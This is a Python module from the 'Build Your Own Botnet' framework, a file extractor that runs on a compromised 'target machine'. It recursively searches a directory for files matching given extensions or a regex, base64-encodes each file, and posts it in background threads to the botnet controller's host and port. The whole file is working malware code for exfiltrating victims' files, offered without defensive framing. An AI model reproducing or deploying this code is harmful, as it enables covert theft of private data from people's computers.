#!/usr/bin/python
# -*- coding: utf-8 -*-
"File Extractor (Build Your Own Botnet)"

# standard library
import os
import time
import queue
import base64
import re

# utilities
import util

# constants
EXTENSION = "extension"
REGEX = "regex"

# globals
packages = ["util"]
platforms = ["win32", "linux2"]
threads = {}
tasks = queue.Queue()
host = None
port = None
ip = "0.0.0.0"
timestamp = ""
preserve_dirs = False
usage = "extract base_dir <extension/regex> args [-p]"
description = """
Extract files with certain extensions or that match a regex from target machine
"""

# main
@util.threaded
def _threader():
    try:
        retries = 0
        while True:
            try:
                method, task = tasks.get_nowait()
                if callable(method):
                    method(task)
                tasks.task_done()
            except:
                if retries < 3:
                    retries += 1
                    time.sleep(5)
                    continue
                else:
                    break
    except Exception as e:
        util.log("{} error: {}".format(_threader.__name__, str(e)))


@util.threaded
def _iter_files(base_dir, method, args):
    try:
        if method == EXTENSION:
            is_match = lambda e, f: os.path.splitext(e)[1] in f
        elif method == REGEX:
            is_match = lambda e, f: bool(re.compile(f[0]).search(os.path.basename(e)))
        else:
            util.log("{} error: {}".format(_iter_files.__name__, "invalid method name"))
            return
        
        globals()['timestamp'] = str(int(time.time()))

        for (root, _, files) in os.walk(base_dir, topdown=True):
            for filename in files:
                if is_match(filename, args):
                    globals()["tasks"].put_nowait(
                        (upload_file, os.path.join(root, filename))
                    )

    except Exception as e:
        util.log("{} error: {}".format(_iter_files.__name__, str(e)))


def upload_file(filename):
    if os.path.isfile(filename):
        util.log(filename)
        _, filetype = os.path.splitext(filename)
        with open(filename, "rb") as fp:
            data = base64.b64encode(fp.read())
        json_data = {
            "data": str(data, "ascii"),
            "type": filetype,
            "filename": ip+"-"+timestamp+(filename if preserve_dirs else "/"+os.path.basename(filename)),
        }
        util.post("http://{}:{}".format(host, port + 3), json=json_data)


def extract(directory, method, args):
    if not os.path.isdir(directory):
        util.log("Target directory '{}' not found".format(directory))
        return "Directory not found!"
    globals()["threads"]["iter_files"] = _iter_files(directory, method, args)
    globals()["threads"]["upload_files"] = _threader()
    return "Extraction started"


def run(ip, host, port, args=None):
    global usage
    if args:
        globals()["host"] = host
        globals()["port"] = port
        globals()["ip"] = ip
        args = str(args).split()
        if len(args) < 3 or (args[-1] == "-p" and len(args) < 4):
            return usage
        if args[1] not in [EXTENSION, REGEX]:
            return usage
        if args[-1] == "-p":
            globals()["preserve_dirs"] = True
            return extract(args[0], args[1], args[2:-1])
        else:
            globals()["preserve_dirs"] = False
            return extract(args[0], args[1], args[2:])
    return usage
